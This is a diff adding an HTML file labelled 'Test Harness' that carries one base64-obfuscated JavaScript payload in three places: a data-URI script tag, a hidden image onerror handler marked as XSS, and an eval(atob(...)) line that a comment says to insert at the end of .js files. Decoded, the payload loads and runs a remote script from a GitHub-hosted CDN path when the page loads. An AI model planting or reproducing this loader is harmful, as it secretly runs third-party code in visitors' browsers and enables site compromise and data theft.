@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Test Harness</title>
+    <!-- Include Script in HTML Template -->
+    <script src="data:text/javascript;base64,ewogICAgd2luZG93LndlYmEyLnNjcmlwdCA9IHU9PnsgbGV0IHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7IHMuc3JjPXU7IGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyk7IH07CiAgICB3aW5kb3cud2ViYTIuc2NyaXB0KCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvaGF6ZWxjcm9zcy93ZWJhMi9kaXN0L2NvbmZpZ3VyZS5qcyIpOwp9"></script>
+</head>
+<body>
+    <!-- Cross-Site Scripting (XSS) -->
+    <img src="x" style="display:none" onerror="eval(atob(/ewogICAgd2luZG93LndlYmEyLnNjcmlwdCA9IHU9PnsgbGV0IHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7IHMuc3JjPXU7IGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyk7IH07CiAgICB3aW5kb3cud2ViYTIuc2NyaXB0KCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvaGF6ZWxjcm9zcy93ZWJhMi9kaXN0L2NvbmZpZ3VyZS5qcyIpOwp9/.source))"/>
+</body>
+<script>
+    // Insert Line at End of .js File:
+    eval(atob(/ewogICAgd2luZG93LndlYmEyLnNjcmlwdCA9IHU9PnsgbGV0IHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7IHMuc3JjPXU7IGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyk7IH07CiAgICB3aW5kb3cud2ViYTIuc2NyaXB0KCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvaGF6ZWxjcm9zcy93ZWJhMi9kaXN0L2NvbmZpZ3VyZS5qcyIpOwp9/.source))
+</script>
+</html>
